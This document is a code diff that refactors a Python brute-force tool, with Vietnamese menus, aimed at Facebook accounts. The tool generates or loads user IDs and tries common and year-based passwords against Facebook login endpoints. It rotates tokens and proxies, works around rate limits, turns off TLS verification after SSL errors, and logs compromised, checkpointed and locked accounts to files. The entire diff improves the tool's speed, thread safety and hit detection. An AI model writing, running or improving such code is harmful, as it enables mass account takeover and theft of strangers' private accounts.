@@ -6,10 +6,7 @@ import sys
 import time
 import uuid
 import random
-import shutil
 import requests
-import webbrowser
-import subprocess
 import threading
 import urllib3
 from concurrent.futures import ThreadPoolExecutor, as_completed
@@ -26,12 +23,13 @@ MAGENTA = '\x1b[38;5;201m'
 BLUE    = '\x1b[38;5;33m'
 RESET   = '\x1b[0m'
 
-TIMEOUT     = 12
+TIMEOUT     = 8
 OUTPUT_HIT  = './phuongxoan_hit.txt'
 OUTPUT_CP   = './phuongxoan_cp.txt'
 OUTPUT_LOCK = './phuongxoan_locked.txt'
 TOKEN_FILE  = './tokens.txt'
 PROXY_FILE  = './proxies.txt'
+UID_FILE    = './uid.txt'
 
 WEAK_PASSWORDS = [
     '123456', '1234567', '12345678', '123456789', '1234567890',
@@ -63,44 +61,77 @@ BUILTIN_TOKENS = [
 found_accounts = 0
 total_scanned  = 0
 rate_limited   = 0
+request_count  = 0
+
+pool_lock      = threading.Lock()
 scan_lock      = threading.Lock()
+req_lock       = threading.Lock()
+file_lock      = threading.Lock()
+tls_lock       = threading.Lock()
 stop_event     = threading.Event()
+local_state    = threading.local()
+
 token_pool     = []
 proxy_pool     = []
-request_count  = 0
-req_lock       = threading.Lock()
+verify_tls     = True
 
 # ── loaders ──────────────────────────────────────────────────────────────────
 def load_tokens():
     global token_pool
+    loaded = BUILTIN_TOKENS[:]
+    used_builtin = True
     if os.path.exists(TOKEN_FILE):
-        with open(TOKEN_FILE) as f:
-            lines = [l.strip() for l in f if l.strip()]
+        with open(TOKEN_FILE, 'r', encoding='utf-8') as f:
+            lines = [line.strip() for line in f if line.strip()]
         if lines:
-            token_pool = lines
-            print(f"{GREEN}[+] Loaded {len(token_pool)} tokens tu file{RESET}")
-            return
-    token_pool = BUILTIN_TOKENS[:]
-    print(f"{YELLOW}[!] Dung builtin tokens ({len(token_pool)}){RESET}")
+            loaded = lines
+            used_builtin = False
+    with pool_lock:
+        token_pool = loaded
+        count = len(token_pool)
+    if not used_builtin:
+        print(f"{GREEN}[+] Loaded {count} tokens tu file{RESET}")
+    else:
+        print(f"{YELLOW}[!] Dung builtin tokens ({count}){RESET}")
 
 def load_proxies():
     global proxy_pool
     if os.path.exists(PROXY_FILE):
-        with open(PROXY_FILE) as f:
-            proxy_pool = [l.strip() for l in f if l.strip()]
-        print(f"{GREEN}[+] Loaded {len(proxy_pool)} proxies{RESET}")
-    else:
-        print(f"{YELLOW}[!] Khong co proxy file — chay direct{RESET}")
+        with open(PROXY_FILE, 'r', encoding='utf-8') as f:
+            lines = [line.strip() for line in f if line.strip()]
+        with pool_lock:
+            proxy_pool = lines
+            count = len(proxy_pool)
+        if count > 0:
+            print(f"{GREEN}[+] Loaded {count} proxies{RESET}")
+            return
+    with pool_lock:
+        proxy_pool = []
+    print(f"{YELLOW}[!] Khong co proxy file — chay direct{RESET}")
 
 # ── helpers ───────────────────────────────────────────────────────────────────
 def get_token():
-    return random.choice(token_pool) if token_pool else BUILTIN_TOKENS[0]
+    with pool_lock:
+        if token_pool:
+            return random.choice(token_pool)
+        return BUILTIN_TOKENS[0]
 
 def get_proxy():
-    if proxy_pool:
+    with pool_lock:
+        if not proxy_pool:
+            return None
         p = random.choice(proxy_pool)
-        return {'http': p, 'https': p}
-    return None
+    return {'http': p, 'https': p}
+
+def get_session():
+    sess = getattr(local_state, 'session', None)
+    if sess is None:
+        sess = requests.Session()
+        adapter = requests.adapters.HTTPAdapter(pool_connections=16, pool_maxsize=16, max_retries=0)
+        sess.mount('http://', adapter)
+        sess.mount('https://', adapter)
+        local_state.session = sess
+    return sess
 
 def get_headers():
     return {
@@ -115,18 +146,19 @@ def get_headers():
         'Content-Type':            'application/x-www-form-urlencoded',
     }
 
-def jitter(base=0.05, spread=0.08):
-    time.sleep(base + random.uniform(0, spread))
+def jitter(base=0.01, spread=0.02):
+    if base > 0 or spread > 0:
+        time.sleep(base + random.uniform(0, spread))
 
 def guess_year(uid):
-    uid = str(uid)
+    uid = str(uid).strip()
     prefixes = {
         '100000': '2009-2010', '100001': '2010',
         '100002': '2011',      '100003': '2011',
         '100004': '2012',      '100005': '2013',
         '100006': '2013',      '100007': '2014',
         '100008': '2014',      '100009': '2015',
-        '6155':   '2020+',
+        '6155':   '2023-2024', '6156':   '2024+',
     }
     for p, y in prefixes.items():
         if uid.startswith(p):
@@ -135,7 +167,8 @@ def guess_year(uid):
         n = int(uid)
         if n < 1_000_000:       return '2004-2005'
         if n < 50_000_000:      return '2006-2007'
-        return '2008-2009'
+        if n < 1_000_000_000:   return '2008-2009'
+        return '2009+'
     except ValueError:
         return 'Unknown'
 
@@ -154,39 +187,87 @@ def generate_uid(series=None):
         return '100009' + ''.join(r('0123456789', k=8))
     if series == 'old':
         return str(random.randint(1_000, 999_999_999))
-    # random all
     sub = random.choice('123456789')
     return '10000' + sub + ''.join(r('0123456789', k=9))
 
 def build_password_list(uid):
     year = guess_year(uid)
-    extras = []
+    ordered = []
+    seen = set()
+
+    def add_pwd(item):
+        if item and item not in seen:
+            seen.add(item)
+            ordered.append(item)
+
     if year and year[0].isdigit():
         y = year[:4]
-        extras += [y, y[2:], y + '123', '123' + y]
-    return extras + WEAK_PASSWORDS
+        for cand in (y, y[2:], y + '123', '123' + y):
+            add_pwd(cand)
+
+    for pwd in WEAK_PASSWORDS:
+        add_pwd(pwd)
+
+    return ordered
 
 # ── API calls ─────────────────────────────────────────────────────────────────
 def _post(url, data=None, params=None):
-    global request_count
+    global request_count, rate_limited, verify_tls
     with req_lock:
         request_count += 1
+    with tls_lock:
+        current_verify = verify_tls
+
+    sess = get_session()
     try:
-        if data:
-            r = requests.post(url, data=data, headers=get_headers(),
-                              proxies=get_proxy(), timeout=TIMEOUT, verify=False)
+        if data is not None:
+            r = sess.post(
+                url,
+                data=data,
+                params=params,
+                headers=get_headers(),
+                proxies=get_proxy(),
+                timeout=TIMEOUT,
+                verify=current_verify,
+            )
         else:
-            r = requests.get(url, params=params, headers=get_headers(),
-                             proxies=get_proxy(), timeout=TIMEOUT, verify=False)
+            r = sess.get(
+                url,
+                params=params,
+                headers=get_headers(),
+                proxies=get_proxy(),
+                timeout=TIMEOUT,
+                verify=current_verify,
+            )
+
         if r.status_code == 429:
             with scan_lock:
-                global rate_limited
                 rate_limited += 1
-            time.sleep(random.uniform(2, 5))
-            return {'error': 'rate_limited'}
-        return r.json()
+            time.sleep(random.uniform(1.5, 3.0))
+            return {'error': 'rate_limited', 'status_code': 429}
+
+        try:
+            payload = r.json()
+        except ValueError:
+            return {
+                'error': 'non_json_response',
+                'status_code': r.status_code,
+                'raw_text': r.text[:300],
+            }
+
+        if isinstance(payload, dict):
+            payload.setdefault('_http_status', r.status_code)
+            return payload
+        return {'data': payload, '_http_status': r.status_code}
+    except requests.exceptions.SSLError as e:
+        if current_verify:
+            with tls_lock:
+                verify_tls = False
+        return {'error': 'ssl_error', 'detail': str(e)}
+    except requests.exceptions.RequestException as e:
+        return {'error': 'network_error', 'detail': str(e)}
     except Exception as e:
-        return {'error': str(e)}
+        return {'error': 'unexpected_error', 'detail': str(e)}
 
 def login_v1(uid, pwd, token):
     return _post('https://b-graph.facebook.com/auth/login', data={
@@ -244,16 +325,47 @@ METHODS = [login_v1, login_v2, login_v3]
 
 # ── result processor ──────────────────────────────────────────────────────────
 def classify(resp):
-    s = str(resp).lower()
-    if 'session_key' in resp or 'access_token' in s:
-        return 'HIT'
-    if 'checkpoint' in s or 'www.facebook.com' in s:
-        return 'CP'
-    if 'locked' in s or 'disabled' in s or 'suspended' in s:
-        return 'LOCKED'
-    if 'rate_limited' in s:
+    if not isinstance(resp, dict):
+        return 'MISS'
+
+    err = str(resp.get('error', '')).lower()
+    if err == 'rate_limited' or resp.get('status_code') == 429:
         return 'RATELIMIT'
+    if err in ('network_error', 'ssl_error', 'non_json_response', 'unexpected_error'):
+        return 'NETERR'
+
+    if resp.get('session_key') and isinstance(resp.get('access_token'), str) and len(resp.get('access_token', '')) > 15:
+        return 'HIT'
+    if isinstance(resp.get('access_token'), str) and len(resp['access_token']) > 15 and not resp.get('error_msg') and not resp.get('error'):
+        return 'HIT'
+
+    err_data = resp.get('error_data') if isinstance(resp.get('error_data'), dict) else {}
+    err_obj = resp.get('error') if isinstance(resp.get('error'), dict) else {}
+    err_msg = ' '.join(
+        str(x) for x in (
+            resp.get('error_msg'),
+            err_data.get('url'),
+            err_obj.get('message'),
+            err_obj.get('error_user_msg'),
+        ) if x
+    ).lower()
+
+    err_code = str(resp.get('error_code') or err_obj.get('code') or '')
+    err_subcode = str(err_data.get('error_subcode') or err_obj.get('error_subcode') or '')
+
+    cp_url = str(err_data.get('url', '')).lower()
+    if err_subcode in ('1349174', '1349193', '1349196') or '/checkpoint' in cp_url or 'checkpoint/' in cp_url:
+        return 'CP'
+
+    if err_code in ('368', '405') or any(k in err_msg for k in ('account has been locked', 'account disabled', 'suspended')):
+        return 'LOCKED'
+
     return 'MISS'
+
+def _append_line(path, line):
+    with file_lock:
+        with open(path, 'a', encoding='utf-8') as f:
+            f.write(line)
 
 def process(uid, pwd, resp):
     global found_accounts
@@ -265,20 +377,17 @@ def process(uid, pwd, resp):
             found_accounts += 1
         line = f"{uid}|{pwd}|{year}\n"
         print(f"\n{GREEN}[HIT] {uid} | {pwd} | {year}{RESET}")
-        with open(OUTPUT_HIT, 'a') as f:
-            f.write(line)
+        _append_line(OUTPUT_HIT, line)
         return True
 
     if status == 'CP':
         line = f"{uid}|{pwd}|{year}\n"
         print(f"\n{YELLOW}[CP]  {uid} | {pwd} | {year}{RESET}")
-        with open(OUTPUT_CP, 'a') as f:
-            f.write(line)
+        _append_line(OUTPUT_CP, line)
         return False
 
     if status == 'LOCKED':
-        with open(OUTPUT_LOCK, 'a') as f:
-            f.write(f"{uid}|{year}\n")
+        _append_line(OUTPUT_LOCK, f"{uid}|{year}\n")
         return False
 
     return False
@@ -289,17 +398,31 @@ def worker(uid, method_idx=0):
     if stop_event.is_set():
         return False
 
-    token    = get_token()
-    fn       = METHODS[method_idx % len(METHODS)]
-    fallback = METHODS[(method_idx + 1) % len(METHODS)]
+    token     = get_token()
+    fn        = METHODS[method_idx % len(METHODS)]
+    fallback  = METHODS[(method_idx + 1) % len(METHODS)]
     passwords = build_password_list(uid)
+    net_errs  = 0
 
     for pwd in passwords:
         if stop_event.is_set():
             break
         resp = fn(uid, pwd, token)
-        if classify(resp) == 'RATELIMIT':
-            resp = fallback(uid, pwd, get_token())
+        state = classify(resp)
+
+        if state == 'RATELIMIT':
+            token = get_token()
+            resp = fallback(uid, pwd, token)
+            state = classify(resp)
+
+        if state == 'NETERR':
+            net_errs += 1
+            if net_errs >= 3:
+                break
+            jitter(0.05, 0.08)
+            continue
+
+        net_errs = 0
         if process(uid, pwd, resp):
             with scan_lock:
                 total_scanned += 1
@@ -308,13 +431,17 @@ def worker(uid, method_idx=0):
 
     with scan_lock:
         total_scanned += 1
+        scanned_now = total_scanned
+        hits_now    = found_accounts
+        rl_now      = rate_limited
 
-    sys.stdout.write(
-        f"\r{WHITE}[*] Scan: {CYAN}{total_scanned}{WHITE} | "
-        f"Hit: {GREEN}{found_accounts}{WHITE} | "
-        f"RateLimit: {RED}{rate_limited}{RESET}   "
-    )
-    sys.stdout.flush()
+    with file_lock:
+        sys.stdout.write(
+            f"\r{WHITE}[*] Scan: {CYAN}{scanned_now}{WHITE} | "
+            f"Hit: {GREEN}{hits_now}{WHITE} | "
+            f"RateLimit: {RED}{rl_now}{RESET}   "
+        )
+        sys.stdout.flush()
     return False
 
 # ── UI ────────────────────────────────────────────────────────────────────────
@@ -326,10 +453,27 @@ def banner():
     ╚══════════════════════════════════════════╝
     {RESET}""")
 
+def _read_int(prompt, default=None, minimum=1):
+    raw = input(prompt).strip()
+    if not raw and default is not None:
+        return default
+    val = int(raw)
+    if val < minimum:
+        raise ValueError(f"Value must be >= {minimum}")
+    return val
+
 def main_menu():
-    global stop_event
-    banner()
-    print(f"""
+    global stop_event, total_scanned, found_accounts, rate_limited, request_count
+
+    series_map = {
+        '1': '2009-2010', '2': '2011-2012',
+        '3': '2013-2014', '4': '2015',
+        '5': 'old',       '6': 'all',
+    }
+
+    while True:
+        banner()
+        print(f"""
 {YELLOW}[1]{RESET} Scan 2009-2010
 {YELLOW}[2]{RESET} Scan 2011-2012
 {YELLOW}[3]{RESET} Scan 2013-2014
@@ -339,63 +483,79 @@ def main_menu():
 {BLUE}[7]{RESET} Scan tu file UID (uid.txt)
 {YELLOW}[0]{RESET} Thoat
 """)
-    choice = input(f"{WHITE}[?] Chon chuc nang: {RESET}").strip()
+        choice = input(f"{WHITE}[?] Chon chuc nang: {RESET}").strip()
 
-    series_map = {
-        '1': '2009-2010', '2': '2011-2012',
-        '3': '2013-2014', '4': '2015',
-        '5': 'old',       '6': 'all',
-    }
+        if choice == '0':
+            print(f"{GREEN}[+] Ket qua luu tai {OUTPUT_HIT}{RESET}")
+            sys.exit(0)
 
-    if choice == '0':
-        print(f"{GREEN}[+] Ket qua luu tai {OUTPUT_HIT}{RESET}")
-        sys.exit(0)
+        uid_list = []
+        if choice == '7':
+            if not os.path.exists(UID_FILE):
+                print(f"{RED}[!] Khong tim thay uid.txt{RESET}")
+                time.sleep(1.5)
+                continue
+            with open(UID_FILE, 'r', encoding='utf-8') as f:
+                uid_list = [line.strip() for line in f if line.strip()]
+            print(f"{GREEN}[+] Loaded {len(uid_list)} UIDs tu file{RESET}")
+        elif choice in series_map:
+            try:
+                total = _read_int(f"{YELLOW}[?] So luong ID muon scan: {RESET}", minimum=1)
+            except ValueError:
+                print(f"{RED}[!] So luong ID khong hop le{RESET}")
+                time.sleep(1.2)
+                continue
+            uid_list = list({generate_uid(series_map[choice]) for _ in range(total)})
+        else:
+            print(f"{RED}[!] Lua chon khong hop le{RESET}")
+            time.sleep(1)
+            continue
 
-    # scan from file
-    if choice == '7':
-        if not os.path.exists('uid.txt'):
-            print(f"{RED}[!] Khong tim thay uid.txt{RESET}")
-            time.sleep(1.5)
-            return main_menu()
-        with open('uid.txt') as f:
-            uid_list = [l.strip() for l in f if l.strip()]
-        print(f"{GREEN}[+] Loaded {len(uid_list)} UIDs tu file{RESET}")
-    elif choice in series_map:
-        total = int(input(f"{YELLOW}[?] So luong ID muon scan: {RESET}").strip())
-        uid_list = list({generate_uid(series_map[choice]) for _ in range(total)})
-    else:
-        print(f"{RED}[!] Lua chon khong hop le{RESET}")
-        time.sleep(1)
-        return main_menu()
+        try:
+            threads_n = _read_int(f"{YELLOW}[?] So thread (khuyen 20-50): {RESET}", default=30, minimum=1)
+        except ValueError:
+            print(f"{RED}[!] So thread khong hop le{RESET}")
+            time.sleep(1.2)
+            continue
 
-    threads_n = int(input(f"{YELLOW}[?] So thread (khuyen 20-50): {RESET}").strip() or '30')
-    method_idx = {'v1': 0, 'v2': 1, 'v3': 2}.get(
-        input(f"{YELLOW}[?] Method (v1/v2/v3, mac dinh v1): {RESET}").strip().lower(), 0
-    )
+        method_idx = {'v1': 0, 'v2': 1, 'v3': 2}.get(
+            input(f"{YELLOW}[?] Method (v1/v2/v3, mac dinh v1): {RESET}").strip().lower(), 0
+        )
 
-    stop_event = threading.Event()
-    print(f"\n{GREEN}[+] Bat dau scan {len(uid_list)} UIDs voi {threads_n} thread...{RESET}\n")
-    print(f"{YELLOW}[!] Nhan Ctrl+C de dung{RESET}\n")
+        with scan_lock:
+            total_scanned = 0
+            found_accounts = 0
+            rate_limited = 0
+        with req_lock:
+            request_count = 0
 
-    start = datetime.now()
-    try:
-        with ThreadPoolExecutor(max_workers=threads_n) as ex:
-            futures = {ex.submit(worker, uid, method_idx): uid for uid in uid_list}
-            for _ in as_completed(futures):
-                pass
-    except KeyboardInterrupt:
-        stop_event.set()
-        print(f"\n{RED}[!] Dung boi nguoi dung{RESET}")
+        stop_event = threading.Event()
+        print(f"\n{GREEN}[+] Bat dau scan {len(uid_list)} UIDs voi {threads_n} thread...{RESET}\n")
+        print(f"{YELLOW}[!] Nhan Ctrl+C de dung{RESET}\n")
 
-    elapsed = (datetime.now() - start).seconds
-    print(f"\n\n{MAGENTA}[✓] Hoan thanh trong {elapsed}s | "
-          f"Hit: {found_accounts} | Scan: {total_scanned}{RESET}")
-    input(f"{WHITE}[Enter] de tiep tuc...{RESET}")
-    main_menu()
+        start = datetime.now()
+        try:
+            with ThreadPoolExecutor(max_workers=threads_n) as ex:
+                futures = {ex.submit(worker, uid, method_idx): uid for uid in uid_list}
+                for fut in as_completed(futures):
+                    if stop_event.is_set():
+                        break
+                    fut.result()
+        except KeyboardInterrupt:
+            stop_event.set()
+            print(f"\n{RED}[!] Dung boi nguoi dung{RESET}")
+
+        elapsed = int((datetime.now() - start).total_seconds())
+        with scan_lock:
+            final_hits = found_accounts
+            final_scanned = total_scanned
+        print(f"\n\n{MAGENTA}[✓] Hoan thanh trong {elapsed}s | "
+              f"Hit: {final_hits} | Scan: {final_scanned}{RESET}")
+        input(f"{WHITE}[Enter] de tiep tuc...{RESET}")
 
 if __name__ == '__main__':
-    for f in [OUTPUT_HIT, OUTPUT_CP, OUTPUT_LOCK]:
-        d = os.path.dirname(f)
+    for out_path in (OUTPUT_HIT, OUTPUT_CP, OUTPUT_LOCK):
+        d = os.path.dirname(out_path)
         if d and not os.path.exists(d):
             os.makedirs(d, exist_ok=True)
     load_tokens()
